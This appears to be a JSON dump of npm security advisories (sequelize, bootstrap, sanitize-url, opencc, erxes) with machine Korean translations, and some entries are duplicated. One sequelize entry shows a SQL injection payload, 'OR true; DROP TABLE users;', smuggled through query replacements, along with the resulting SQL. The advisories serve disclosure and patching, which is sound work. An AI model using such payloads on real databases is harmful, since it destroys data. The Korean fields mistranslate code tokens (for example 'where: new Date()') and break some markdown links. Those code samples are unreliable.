    "identifiers": "GHSA : GHSA-q8gg-vj6m-hgmj\nCVE : CVE-2022-48345",
    "severity": "MODERATE",
    "updatedAt": "2023-03-03T00:11:25Z",
    "publishedAt": "2023-02-24T06:30:16Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-48345\nhttps://github.com/braintree/sanitize-url/commit/d4bdc89f1743fe3cdb7c3f24b06e4c875f349b0c\nhttps://github.com/braintree/sanitize-url/compare/v6.0.0...v6.0.1\nhttps://github.com/braintree/sanitize-url/compare/v6.0.1...v6.0.2\nhttps://github.com/advisories/GHSA-q8gg-vj6m-hgmj",
    "name": "@braintree/sanitize-url",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.1",
    "identifier": "6.0.1",
    "descriptionKR": "6.0.1 이전의 sanitize-url(일명 @braintree/sanitize-url)은 HTML 엔티티를 통한 XSS를 허용합니다."
  },
  {
    "description": "### Impact\n\nProviding an invalid value to the `where` option of a query caused Sequelize to ignore that option instead of throwing an error. \n\nA finder call like the following did not throw an error:\n\n```ts\nUser.findAll({\n  where: new Date(),\n});\n```\n\nAs this option is typically used with plain javascript objects, be aware that this only happens at the top level of this option.\n\n### Patches\n\nThis issue has been patched in [`sequelize@6.28.1`](https://github.com/sequelize/sequelize/pull/15699) & [`@sequelize/core@7.0.0.alpha-20`](https://github.com/sequelize/sequelize/pull/15375)\n\n### References\n\nA discussion thread about this issue is open at https://github.com/sequelize/sequelize/discussions/15698\n\nCVE:  CVE-2023-22579\nSnyk: https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-3324090",
    "identifiers": "GHSA : GHSA-vqfx-gj96-3w95\nCVE : CVE-2023-22579",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-23T16:58:57Z",
    "publishedAt": "2023-02-23T16:58:56Z",
    "references": "https://github.com/sequelize/sequelize/security/advisories/GHSA-vqfx-gj96-3w95\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22579\nhttps://github.com/sequelize/sequelize/pull/15375\nhttps://github.com/sequelize/sequelize/pull/15699\nhttps://csirt.divd.nl/CVE-2023-22579\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/sequelize/sequelize/discussions/15698\nhttps://github.com/sequelize/sequelize/releases/tag/v6.28.1\nhttps://github.com/sequelize/sequelize/releases/tag/v7.0.0-alpha.20\nhttps://github.com/advisories/GHSA-vqfx-gj96-3w95",
    "name": "@sequelize/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.0.0-alpha.20",
    "identifier": "7.0.0-alpha.20",
    "descriptionKR": "### 영향\n\n쿼리의 `where` 옵션에 유효하지 않은 값을 제공하면 Sequelize가 오류를 발생시키는 대신 해당 옵션을 무시했습니다.\n\n다음과 같은 찾기 호출은 오류를 발생시키지 않았습니다.\n\n```ts\nUser.findAll({\n  여기서: 새 날짜(),\n});\n```\n\n이 옵션은 일반적으로 일반 자바스크립트 개체와 함께 사용되므로 이 옵션의 최상위 수준에서만 발생한다는 점에 유의하세요.\n\n### 패치\n\n이 문제는 [`sequelize@6.28.1`](https://github.com/sequelize/sequelize/pull/15699) 및 [`@sequelize/core@7.0.0.alpha-20`](에서 패치되었습니다. https://github.com/sequelize/sequelize/pull/15375)\n\n### 참조\n\n이 문제에 대한 토론 스레드는 https://github.com/sequelize/sequelize/discussions/15698에서 열려 있습니다.\n\nCVE: CVE-2023-22579\nSNYK: https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-3324090"
  },
  {
    "description": "### Impact\n\nProviding an invalid value to the `where` option of a query caused Sequelize to ignore that option instead of throwing an error. \n\nA finder call like the following did not throw an error:\n\n```ts\nUser.findAll({\n  where: new Date(),\n});\n```\n\nAs this option is typically used with plain javascript objects, be aware that this only happens at the top level of this option.\n\n### Patches\n\nThis issue has been patched in [`sequelize@6.28.1`](https://github.com/sequelize/sequelize/pull/15699) & [`@sequelize/core@7.0.0.alpha-20`](https://github.com/sequelize/sequelize/pull/15375)\n\n### References\n\nA discussion thread about this issue is open at https://github.com/sequelize/sequelize/discussions/15698\n\nCVE:  CVE-2023-22579\nSnyk: https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-3324090",
    "identifiers": "GHSA : GHSA-vqfx-gj96-3w95\nCVE : CVE-2023-22579",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-23T16:58:57Z",
    "publishedAt": "2023-02-23T16:58:56Z",
    "references": "https://github.com/sequelize/sequelize/security/advisories/GHSA-vqfx-gj96-3w95\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22579\nhttps://github.com/sequelize/sequelize/pull/15375\nhttps://github.com/sequelize/sequelize/pull/15699\nhttps://csirt.divd.nl/CVE-2023-22579\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/sequelize/sequelize/discussions/15698\nhttps://github.com/sequelize/sequelize/releases/tag/v6.28.1\nhttps://github.com/sequelize/sequelize/releases/tag/v7.0.0-alpha.20\nhttps://github.com/advisories/GHSA-vqfx-gj96-3w95",
    "name": "sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.28.1",
    "identifier": "6.28.1",
    "descriptionKR": "### 영향\n\n쿼리의 `where` 옵션에 유효하지 않은 값을 제공하면 Sequelize가 오류를 발생시키는 대신 해당 옵션을 무시했습니다.\n\n다음과 같은 찾기 호출은 오류를 발생시키지 않았습니다.\n\n```ts\nUser.findAll({\n  여기서: 새 날짜(),\n});\n```\n\n이 옵션은 일반적으로 일반 자바스크립트 개체와 함께 사용되므로 이 옵션의 최상위 수준에서만 발생한다는 점에 유의하세요.\n\n### 패치\n\n이 문제는 [`sequelize@6.28.1`](https://github.com/sequelize/sequelize/pull/15699) 및 [`@sequelize/core@7.0.0.alpha-20`](에서 패치되었습니다. https://github.com/sequelize/sequelize/pull/15375)\n\n### 참조\n\n이 문제에 대한 토론 스레드는 https://github.com/sequelize/sequelize/discussions/15698에서 열려 있습니다.\n\nCVE: CVE-2023-22579\nSNYK: https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-3324090"
  },
  {
    "description": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of [GHSA-vqfx-gj96-3w95](https://github.com/advisories/GHSA-vqfx-gj96-3w95). This link is maintained to preserve external references.\n\n## Original Description\nDue to improper parameter filtering in the sequalize js library, can a attacker peform injection.",
    "identifiers": "GHSA : GHSA-r3vq-92c6-3mqf",
    "severity": "HIGH",
    "updatedAt": "2023-04-28T22:06:25Z",
    "publishedAt": "2023-02-16T15:30:28Z",
    "withdrawnAt": "2023-02-23T16:57:49Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-22579\nhttps://csirt.divd.nl/CVE-2023-22579\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/advisories/GHSA-r3vq-92c6-3mqf",
    "name": "@sequelize/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.0.0-alpha.20",
    "identifier": "7.0.0-alpha.20",
    "descriptionKR": "## 중복 자문\n이 권고는 [GHSA-vqfx-gj96-3w95](https://github.com/advisories/GHSA-vqfx-gj96-3w95)와 중복되므로 철회되었습니다. 이 링크는 외부 참조를 보존하기 위해 유지됩니다.\n\n## 원본 설명\nSequalize js 라이브러리의 부적절한 매개변수 필터링으로 인해 공격자가 주입을 수행할 수 있습니다."
  },
  {
    "description": "Open Chinese Convert (OpenCC) 1.0.5 allows attackers to cause a denial of service (segmentation fault) because BinaryDict::NewFromFile in BinaryDict.cpp may have out-of-bounds keyOffset and valueOffset values via a crafted .ocd file.",
    "identifiers": "GHSA : GHSA-9qh2-6fxg-9m4g\nCVE : CVE-2018-16982",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T23:27:41Z",
    "publishedAt": "2022-05-14T01:55:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-16982\nhttps://github.com/BYVoid/OpenCC/issues/303\nhttps://github.com/BYVoid/OpenCC/pull/309\nhttps://github.com/BYVoid/OpenCC/pull/560\nhttps://github.com/BYVoid/OpenCC/pull/560/commits/e1b8c7949738100e4747dd4109ef1f16e1bd99c4\nhttps://github.com/BYVoid/OpenCC/commit/4a4f9e58e505fca93605f22363c133df66a91a5e\nhttps://github.com/advisories/GHSA-9qh2-6fxg-9m4g",
    "name": "opencc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.2",
    "identifier": "1.1.2",
    "descriptionKR": "Open CC(Open Chinese Convert) 1.0.5는 공격자가 서비스 거부(분할 오류)를 일으킬 수 있도록 허용합니다. 왜냐하면 BinaryDict.cpp의 BinaryDict::NewFromFile이 조작된 .ocd 파일을 통해 범위를 벗어난 keyOffset 및 valueOffset 값을 가질 수 있기 때문입니다."
  },
  {
    "description": "## Duplicate advisory\nThis advisory has been withdrawn because it is a duplicate of [GHSA-f598-mfpv-gmfx](https://github.com/advisories/GHSA-f598-mfpv-gmfx). This link is maintained to preserve external references.\n\n## Original Description\nDue to improper attribute filtering in the sequelize js library, an attacker can peform SQL injections. This issue can be mitigated by not accepting untrusted input.",
    "identifiers": "GHSA : GHSA-8mwq-mj73-qv68",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-24T18:48:36Z",
    "publishedAt": "2023-02-16T15:30:28Z",
    "withdrawnAt": "2023-02-24T18:48:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-22578\nhttps://csirt.divd.nl/CVE-2023-22578\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/sequelize/sequelize/discussions/15694\nhttps://github.com/sequelize/sequelize/releases/tag/v7.0.0-alpha.20\nhttps://github.com/advisories/GHSA-8mwq-mj73-qv68",
    "name": "@sequelize/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.0.0-alpha.20",
    "identifier": "7.0.0-alpha.20",
    "descriptionKR": "## 중복 권고\n이 권고는 [GHSA-f598-mfpv-gmfx](https://github.com/advisories/GHSA-f598-mfpv-gmfx)와 중복되기 때문에 철회되었습니다. 이 링크는 외부 참조를 보존하기 위해 유지됩니다.\n\n## 원본 설명\nSequelize js 라이브러리의 부적절한 속성 필터링으로 인해 공격자가 SQL 주입을 수행할 수 있습니다. 이 문제는 신뢰할 수 없는 입력을 허용하지 않음으로써 완화할 수 있습니다."
  },
  {
    "description": "Due to improper input filtering in the sequelize js library, can malicious queries lead to sensitive information disclosure.",
    "identifiers": "GHSA : GHSA-8c25-f3mj-v6h8\nCVE : CVE-2023-22580",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T23:15:11Z",
    "publishedAt": "2023-02-16T15:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-22580\nhttps://csirt.divd.nl/CVE-2023-22580\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/sequelize/sequelize/pull/15375\nhttps://github.com/sequelize/sequelize/pull/15699\nhttps://github.com/sequelize/sequelize/releases/tag/v6.28.1\nhttps://github.com/sequelize/sequelize/releases/tag/v7.0.0-alpha.20\nhttps://github.com/advisories/GHSA-8c25-f3mj-v6h8",
    "name": "@sequelize/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.0.0-alpha.20",
    "identifier": "7.0.0-alpha.20",
    "descriptionKR": "Sequelize js 라이브러리의 부적절한 입력 필터링으로 인해 악의적인 쿼리가 민감한 정보 공개로 이어질 수 있습니다."
  },
  {
    "description": "Due to improper input filtering in the sequelize js library, can malicious queries lead to sensitive information disclosure.",
    "identifiers": "GHSA : GHSA-8c25-f3mj-v6h8\nCVE : CVE-2023-22580",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T23:15:11Z",
    "publishedAt": "2023-02-16T15:30:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-22580\nhttps://csirt.divd.nl/CVE-2023-22580\nhttps://csirt.divd.nl/DIVD-2022-00020/\nhttps://github.com/sequelize/sequelize/pull/15375\nhttps://github.com/sequelize/sequelize/pull/15699\nhttps://github.com/sequelize/sequelize/releases/tag/v6.28.1\nhttps://github.com/sequelize/sequelize/releases/tag/v7.0.0-alpha.20\nhttps://github.com/advisories/GHSA-8c25-f3mj-v6h8",
    "name": "sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.28.1",
    "identifier": "6.28.1",
    "descriptionKR": "Sequelize js 라이브러리의 부적절한 입력 필터링으로 인해 악의적인 쿼리가 민감한 정보 공개로 이어질 수 있습니다."
  },
  {
    "description": "### Impact\n\nThe SQL injection exploit is related to replacements. Here is such an example: \n\nIn the following query, some parameters are passed through replacements, and some are passed directly through the `where` option.\n\n```typescript\nUser.findAll({\n  where: or(\n    literal('soundex(\"firstName\") = soundex(:firstName)'),\n    { lastName: lastName },\n  ),\n  replacements: { firstName },\n})\n```\n\nThis is a very legitimate use case, but this query was vulnerable to SQL injection due to how Sequelize processed the query: Sequelize built a first query using the `where` option, then passed it over to `sequelize.query` which parsed the resulting SQL to inject all `:replacements`.\n\nIf the user passed values such as\n\n```json\n{\n  \"firstName\": \"OR true; DROP TABLE users;\",\n  \"lastName\": \":firstName\"\n}\n```\n\nSequelize would first generate this query:\n\n```sql\nSELECT * FROM users WHERE soundex(\"firstName\") = soundex(:firstName) OR \"lastName\" = ':firstName'\n```\n\nThen would inject replacements in it, which resulted in this:\n\n```sql\nSELECT * FROM users WHERE soundex(\"firstName\") = soundex('OR true; DROP TABLE users;') OR \"lastName\" = ''OR true; DROP TABLE users;''\n```\n\nAs you can see this resulted in arbitrary user-provided SQL being executed.\n\n### Patches\n\nThe issue was fixed in Sequelize 6.19.1\n\n### Workarounds\n\nDo not use the `replacements` and the `where` option in the same query if you are not using Sequelize >= 6.19.1 \n\n### References\n\nSee this thread for more information: https://github.com/sequelize/sequelize/issues/14519\n\nSnyk: https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-2932027",
    "identifiers": "GHSA : GHSA-wrh9-cjv3-2hpw\nCVE : CVE-2023-25813",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-22T22:59:12Z",
    "publishedAt": "2023-02-22T22:59:09Z",
    "references": "https://github.com/sequelize/sequelize/security/advisories/GHSA-wrh9-cjv3-2hpw\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-25813\nhttps://github.com/sequelize/sequelize/issues/14519\nhttps://github.com/sequelize/sequelize/commit/ccaa3996047fe00048d5993ab2dd43ebadd4f78b\nhttps://github.com/sequelize/sequelize/releases/tag/v6.19.1\nhttps://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-2932027\nhttps://github.com/advisories/GHSA-wrh9-cjv3-2hpw",
    "name": "sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.19.1",
    "identifier": "6.19.1",
    "descriptionKR": "### 영향\n\nSQL 인젝션 익스플로잇은 교체와 관련이 있습니다. 다음은 그러한 예입니다.\n\n다음 쿼리에서 일부 매개변수는 교체를 통해 전달되고 일부는 `where` 옵션을 통해 직접 전달됩니다.\n\n```타입스크립트\nUser.findAll({\n  여기서: 또는(\n    literal('soundex(\"firstName\") = soundex(:firstName)'),\n    { 성: 성 },\n  ),\n  교체: { firstName },\n})\n```\n\n이것은 매우 합법적인 사용 사례이지만 이 쿼리는 Sequelize가 쿼리를 처리하는 방식으로 인해 SQL 주입에 취약했습니다. 모든 `:replacements`를 주입하는 SQL.\n\n사용자가 다음과 같은 값을 전달한 경우\n\n```json\n{\n  \"firstName\": \"OR true; 테이블 삭제 사용자;\",\n  \"성 이름\"\n}\n```\n\nSequelize는 먼저 다음 쿼리를 생성합니다.\n\n```sql\nSELECT * FROM users WHERE soundex(\"firstName\") = soundex(:firstName) OR \"lastName\" = ':firstName'\n```\n\n그런 다음 대체품을 주입하여 다음과 같은 결과를 얻었습니다.\n\n```sql\nSELECT * FROM users WHERE soundex(\"firstName\") = soundex('OR true; DROP TABLE users;') OR \"lastName\" = ''OR true; 드롭 테이블 사용자;''\n```\n\n보시다시피 이로 인해 임의의 사용자 제공 SQL이 실행되었습니다.\n\n### 패치\n\n이 문제는 Sequelize 6.19.1에서 수정되었습니다.\n\n### 해결 방법\n\nSequelize >= 6.19.1을 사용하지 않는 경우 동일한 쿼리에서 `replacements` 및 `where` 옵션을 사용하지 마십시오.\n\n### 참조\n\n자세한 내용은 이 스레드를 참조하세요. https://github.com/sequelize/sequelize/issues/14519\n\nSNYK: https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-2932027"
  },
  {
    "description": "Erxes, an experience operating system (XOS) with a set of plugins, is vulnerable to cross-site scripting in all versions. This results in client-side code execution. The victim must follow a malicious link or be redirected there from malicious web site. There are no known patches.",
    "identifiers": "GHSA : GHSA-g9ph-r9hc-34r8\nCVE : CVE-2021-32853",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T19:16:25Z",
    "publishedAt": "2023-02-21T00:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-32853\nhttps://github.com/erxes/erxes/blob/f131b49add72032650d483f044d00658908aaf4a/widgets/server/index.ts#L54\nhttps://github.com/erxes/erxes/blob/f131b49add72032650d483f044d00658908aaf4a/widgets/server/views/widget.ejs#L14\nhttps://securitylab.github.com/advisories/GHSL-2021-103-erxes/\nhttps://github.com/advisories/GHSA-g9ph-r9hc-34r8",
    "name": "erxes",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.1",
    "descriptionKR": "플러그인 세트가 있는 경험 운영 체제(XOS)인 Erxes는 모든 버전에서 교차 사이트 스크립팅에 취약합니다. 이로 인해 클라이언트 측 코드가 실행됩니다. 피해자는 악성 링크를 따라가거나 악성 웹 사이트에서 해당 링크로 리디렉션되어야 합니다. 알려진 패치가 없습니다."
  },
  {
    "description": "Versions of `bootstrap` prior to 3.4.1 for 3.x and 4.3.1 for 4.x are vulnerable to Cross-Site Scripting (XSS). The  `data-template` attribute of the tooltip and popover plugins lacks input sanitization and may allow attacker to execute arbitrary JavaScript.\n\n\n## Recommendation\n\nFor `bootstrap` 4.x upgrade to 4.3.1 or later.\nFor `bootstrap` 3.x upgrade to 3.4.1 or later.",
    "identifiers": "GHSA : GHSA-9v3m-8fp8-mj99\nCVE : CVE-2019-8331",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T15:03:08Z",
    "publishedAt": "2019-02-22T20:54:47Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-8331\nhttps://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8331\nhttps://github.com/twbs/bootstrap/pull/28236\nhttps://access.redhat.com/errata/RHSA-2019:1456\nhttps://access.redhat.com/errata/RHSA-2019:3023\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://github.com/twbs/bootstrap/releases/tag/v3.4.1\nhttps://github.com/twbs/bootstrap/releases/tag/v4.3.1\nhttps://lists.apache.org/thread.html/10f0f3aefd51444d1198c65f44ffdf2d78ca3359423dbc1c168c9731@%3Cdev.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/17ff53f7999e74fbe3cc0ceb4e1c3b00b180b7c5afec8e978837bc49@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/52bafac05ad174000ea465fe275fd3cc7bd5c25535a7631c0bc9bfb2@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/52e0e6b5df827ee7f1e68f7cc3babe61af3b2160f5d74a85469b7b0e@%3Cdev.superset.apache.org%3E\nhttps://lists.apache.org/thread.html/54df3aeb4239b64b50b356f0ca6f986e3c4ca5b84c515dce077c7854@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/r3dc0cac8d856bca02bd6997355d7ff83027dcfc82f8646a29b89b714@%3Cissues.hbase.apache.org%3E\nhttps://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26@%3Ccommits.pulsar.apache.org%3E\nhttps://seclists.org/bugtraq/2019/May/18\nhttps://support.f5.com/csp/article/K24383845\nhttps://support.f5.com/csp/article/K24383845?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttp://packetstormsecurity.com/files/156743/OctoberCMS-Insecure-Dependencies.html\nhttp://seclists.org/fulldisclosure/2019/May/10\nhttp://seclists.org/fulldisclosure/2019/May/11\nhttp://seclists.org/fulldisclosure/2019/May/13\nhttps://www.tenable.com/security/tns-2021-14\nhttps://web.archive.org/web/20200227083900/http://www.securityfocus.com/bid/107375\nhttps://github.com/advisories/GHSA-9v3m-8fp8-mj99",
    "name": "bootstrap-sass",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.4.1",
    "identifier": "3.4.1",
    "descriptionKR": "3.x용 3.4.1 및 4.x용 4.3.1 이전의 '부트스트랩' 버전은 XSS(교차 사이트 스크립팅)에 취약합니다. 툴팁 및 팝오버 플러그인의 'data-template' 속성에는 입력 삭제가 없으며 공격자가 임의의 JavaScript를 실행할 수 있습니다.\n\n\n## 추천\n\n`bootstrap` 4.x의 경우 4.3.1 이상으로 업그레이드하십시오.\n`bootstrap` 3.x의 경우 3.4.1 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `bootstrap` prior to 3.4.1 for 3.x and 4.3.1 for 4.x are vulnerable to Cross-Site Scripting (XSS). The  `data-template` attribute of the tooltip and popover plugins lacks input sanitization and may allow attacker to execute arbitrary JavaScript.\n\n\n## Recommendation\n\nFor `bootstrap` 4.x upgrade to 4.3.1 or later.\nFor `bootstrap` 3.x upgrade to 3.4.1 or later.",
    "identifiers": "GHSA : GHSA-9v3m-8fp8-mj99\nCVE : CVE-2019-8331",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T15:03:08Z",
    "publishedAt": "2019-02-22T20:54:47Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-8331\nhttps://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8331\nhttps://github.com/twbs/bootstrap/pull/28236\nhttps://access.redhat.com/errata/RHSA-2019:1456\nhttps://access.redhat.com/errata/RHSA-2019:3023\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://github.com/twbs/bootstrap/releases/tag/v3.4.1\nhttps://github.com/twbs/bootstrap/releases/tag/v4.3.1\nhttps://lists.apache.org/thread.html/10f0f3aefd51444d1198c65f44ffdf2d78ca3359423dbc1c168c9731@%3Cdev.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/17ff53f7999e74fbe3cc0ceb4e1c3b00b180b7c5afec8e978837bc49@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/52bafac05ad174000ea465fe275fd3cc7bd5c25535a7631c0bc9bfb2@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/52e0e6b5df827ee7f1e68f7cc3babe61af3b2160f5d74a85469b7b0e@%3Cdev.superset.apache.org%3E\nhttps://lists.apache.org/thread.html/54df3aeb4239b64b50b356f0ca6f986e3c4ca5b84c515dce077c7854@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/r3dc0cac8d856bca02bd6997355d7ff83027dcfc82f8646a29b89b714@%3Cissues.hbase.apache.org%3E\nhttps://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26@%3Ccommits.pulsar.apache.org%3E\nhttps://seclists.org/bugtraq/2019/May/18\nhttps://support.f5.com/csp/article/K24383845\nhttps://support.f5.com/csp/article/K24383845?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttp://packetstormsecurity.com/files/156743/OctoberCMS-Insecure-Dependencies.html\nhttp://seclists.org/fulldisclosure/2019/May/10\nhttp://seclists.org/fulldisclosure/2019/May/11\nhttp://seclists.org/fulldisclosure/2019/May/13\nhttps://www.tenable.com/security/tns-2021-14\nhttps://web.archive.org/web/20200227083900/http://www.securityfocus.com/bid/107375\nhttps://github.com/advisories/GHSA-9v3m-8fp8-mj99",
    "name": "bootstrap",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.4.1",
    "identifier": "3.4.1",
    "descriptionKR": "3.x용 3.4.1 및 4.x용 4.3.1 이전의 '부트스트랩' 버전은 XSS(교차 사이트 스크립팅)에 취약합니다. 툴팁 및 팝오버 플러그인의 'data-template' 속성에는 입력 삭제가 없으며 공격자가 임의의 JavaScript를 실행할 수 있습니다.\n\n\n## 추천\n\n`bootstrap` 4.x의 경우 4.3.1 이상으로 업그레이드하십시오.\n`bootstrap` 3.x의 경우 3.4.1 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `bootstrap` prior to 3.4.1 for 3.x and 4.3.1 for 4.x are vulnerable to Cross-Site Scripting (XSS). The  `data-template` attribute of the tooltip and popover plugins lacks input sanitization and may allow attacker to execute arbitrary JavaScript.\n\n\n## Recommendation\n\nFor `bootstrap` 4.x upgrade to 4.3.1 or later.\nFor `bootstrap` 3.x upgrade to 3.4.1 or later.",
    "identifiers": "GHSA : GHSA-9v3m-8fp8-mj99\nCVE : CVE-2019-8331",
    "severity": "MODERATE",
    "updatedAt": "2023-02-22T15:03:08Z",
    "publishedAt": "2019-02-22T20:54:47Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-8331\nhttps://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8331\nhttps://github.com/twbs/bootstrap/pull/28236\nhttps://access.redhat.com/errata/RHSA-2019:1456\nhttps://access.redhat.com/errata/RHSA-2019:3023\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://github.com/twbs/bootstrap/releases/tag/v3.4.1\nhttps://github.com/twbs/bootstrap/releases/tag/v4.3.1\nhttps://lists.apache.org/thread.html/10f0f3aefd51444d1198c65f44ffdf2d78ca3359423dbc1c168c9731@%3Cdev.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/17ff53f7999e74fbe3cc0ceb4e1c3b00b180b7c5afec8e978837bc49@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/52bafac05ad174000ea465fe275fd3cc7bd5c25535a7631c0bc9bfb2@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/52e0e6b5df827ee7f1e68f7cc3babe61af3b2160f5d74a85469b7b0e@%3Cdev.superset.apache.org%3E\nhttps://lists.apache.org/thread.html/54df3aeb4239b64b50b356f0ca6f986e3c4ca5b84c515dce077c7854@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/r3dc0cac8d856bca02bd6997355d7ff83027dcfc82f8646a29b89b714@%3Cissues.hbase.apache.org%3E\nhttps://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26@%3Ccommits.pulsar.apache.org%3E\nhttps://seclists.org/bugtraq/2019/May/18\nhttps://support.f5.com/csp/article/K24383845\nhttps://support.f5.com/csp/article/K24383845?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttp://packetstormsecurity.com/files/156743/OctoberCMS-Insecure-Dependencies.html\nhttp://seclists.org/fulldisclosure/2019/May/10\nhttp://seclists.org/fulldisclosure/2019/May/11\nhttp://seclists.org/fulldisclosure/2019/May/13\nhttps://www.tenable.com/security/tns-2021-14\nhttps://web.archive.org/web/20200227083900/http://www.securityfocus.com/bid/107375\nhttps://github.com/advisories/GHSA-9v3m-8fp8-mj99",
    "name": "bootstrap",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.3.1",
    "identifier": "4.3.1",
    "descriptionKR": "3.x용 3.4.1 및 4.x용 4.3.1 이전의 '부트스트랩' 버전은 XSS(교차 사이트 스크립팅)에 취약합니다. 툴팁 및 팝오버 플러그인의 'data-template' 속성에는 입력 삭제가 없으며 공격자가 임의의 JavaScript를 실행할 수 있습니다.\n\n\n## 추천\n\n`bootstrap` 4.x의 경우 4.3.1 이상으로 업그레이드하십시오.\n`bootstrap` 3.x의 경우 3.4.1 이상으로 업그레이드하십시오."
  },
  {
